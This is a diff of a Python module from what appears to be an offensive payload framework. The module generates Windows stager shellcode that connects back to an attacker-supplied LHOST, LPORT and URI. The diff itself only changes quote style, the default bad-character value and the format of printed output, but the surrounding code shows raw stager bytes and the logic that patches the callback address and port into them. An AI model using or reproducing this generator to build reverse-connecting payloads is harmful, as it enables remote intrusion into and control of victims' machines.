@@ -22,7 +22,7 @@ class ShellcodeModule:
         self.lport_offset = 180  # This is actually going to be little endian
         self.uri_offset = 272
         self.exit_func = '\xf0\xb5\xa2\x56'
-        self.customized_shellcode = ''
+        self.customized_shellcode = ""
         # The \x5c and \x11 are overwritten by the lport value
         self.stager = (
             b"\xFC\xE8\x86\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
@@ -51,7 +51,7 @@ class ShellcodeModule:
             "LHOST": ["", "LHOST value"],
             "LPORT": ["", "LPORT value"],
             "Encoder": ["None", "Optional: Encoder to use when avoiding bad characters"],
-            "BadChars": ["X", "Optional: Bad characters to avoid"]
+            "BadChars": ["\\x00", "Optional: Bad characters to avoid"]
         }
 
     def cli_gen_shellcode(self):
@@ -67,7 +67,7 @@ class ShellcodeModule:
 
     def payload_gen(self):
         # Take the passed in attributes and gen shellcode
-        ip_shellcode = ''
+        ip_shellcode = ""
         n = 2
         ip_shellcode_stage = binascii.hexlify(self.required_options["LHOST"][0].encode())
         ip_shellcode_stage = [ip_shellcode_stage[i:i + n] for i in range(0, len(ip_shellcode_stage), n)]
@@ -105,7 +105,7 @@ class ShellcodeModule:
         incoming_uri = ordnance_helpers.gen_uri()
 
         # Convert the URI for use within shellcode
-        uri_shellcode = ''
+        uri_shellcode = ""
         hexed_uri = binascii.hexlify(incoming_uri.encode('UTF-8'))
         hexed_uri = [hexed_uri[i:i + n] for i in range(0, len(hexed_uri), n)]
         for two_bites in hexed_uri:
@@ -132,9 +132,9 @@ class ShellcodeModule:
         return
 
     def payload_stats(self):
-        print("Payload Name: " + helpers.color(self.name))
-        print("IP Address: " + helpers.color(self.required_options['LHOST'][0]))
-        print("Port: " + helpers.color(str(self.required_options['LPORT'][0])))
-        print("Shellcode Size: " + helpers.color(str(len(self.customized_shellcode) / 4).rstrip('.0') + '\n'))
+        print(" [*] Payload Name: " + helpers.color(self.name))
+        print(" [*] IP Address: " + helpers.color(self.required_options['LHOST'][0]))
+        print(" [*] Port: " + helpers.color(str(self.required_options['LPORT'][0])))
+        print(" [*] Shellcode Size: " + helpers.color(str(len(self.customized_shellcode) / 4).rstrip('.0') + '\n'))
         print(self.customized_shellcode)
         return
